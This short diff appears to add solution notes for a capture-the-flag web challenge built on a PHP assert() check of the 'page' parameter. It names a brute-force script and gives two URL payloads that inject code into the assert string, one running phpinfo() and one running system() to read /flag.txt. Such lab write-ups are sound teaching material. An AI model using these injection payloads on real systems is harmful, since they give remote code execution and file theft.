@@ -1,0 +1,12 @@
+Should be
+	assert("strpos($_GET['page'], '..')===false") or die('HACKING DETECTED! PLEASE STOP THE HACKING PRETTY PLEASE')
+
+
+================== Solution 1 ==================
+Bruteforce
+
+python3 solve.py
+	
+================== Solution 2 ==================
+?page=%27).phpinfo();%20//
+page=%27).system(%22cat%20/flag.txt%22);%20//
